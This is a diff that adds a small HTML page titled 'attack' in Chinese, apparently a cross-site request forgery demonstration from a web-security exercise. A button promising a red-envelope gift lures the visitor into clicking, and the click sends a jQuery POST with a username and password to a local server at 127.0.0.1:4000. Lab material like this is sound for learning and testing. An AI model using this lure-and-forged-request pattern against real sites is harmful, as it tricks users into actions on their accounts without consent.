@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>攻击</title>
+</head>
+<body>
+<button  id="btn">点我就送红包</button>
+
+<script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+<script>
+    $(function () {
+            $('#btn').click(
+                function (ev) {
+                    ev.preventDefault()
+                    $.ajax({
+                        url:'http://127.0.0.1:4000/con/',
+                        type:'post',
+                        data:{
+                            username:'lisi',
+                            password:'123546'
+                        },
+                        success:function (data) {
+                            alert(data)
+                        },
+                        error: function (err) {
+                            alert(err)
+                        }
+                    })
+                }
+            )
+    })
+
+</script>
+</body>
+</html>
